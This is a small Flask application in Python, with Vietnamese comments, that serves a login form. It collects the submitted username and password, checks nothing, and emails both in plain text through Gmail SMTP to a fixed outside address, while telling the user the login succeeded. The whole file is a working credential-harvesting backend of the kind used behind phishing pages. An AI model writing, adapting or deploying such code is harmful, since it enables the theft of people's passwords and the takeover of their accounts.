# app.py

from flask import Flask, render_template, request
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Gmail credentials
gmail_user = "your_email@gmail.com"
gmail_password = "your_password"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Lấy dữ liệu từ form
        username = request.form['username']
        password = request.form['password']

        # Gửi email
        send_email(username, password)

        # Có thể thêm logic kiểm tra và xử lý dữ liệu ở đây

        return "Đăng nhập thành công và dữ liệu đã được gửi đến email của bạn!"

    return render_template('login.html')

def send_email(username, password):
    # Địa chỉ email nhận
    to_email = "sonlyhongduc@gmail.com"

    # Nội dung email
    subject = "Thông tin đăng nhập"
    body = f"Username: {username}\nPassword: {password}"

    # Tạo đối tượng MIMEText
    msg = MIMEText(body)

    # Thiết lập các thông tin cần thiết
    msg['Subject'] = subject
    msg['From'] = gmail_user
    msg['To'] = to_email

    # Sử dụng SMTP để gửi email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(gmail_user, gmail_password)
        server.sendmail(gmail_user, to_email, msg.as_string())

if __name__ == '__main__':
    app.run(debug=True)
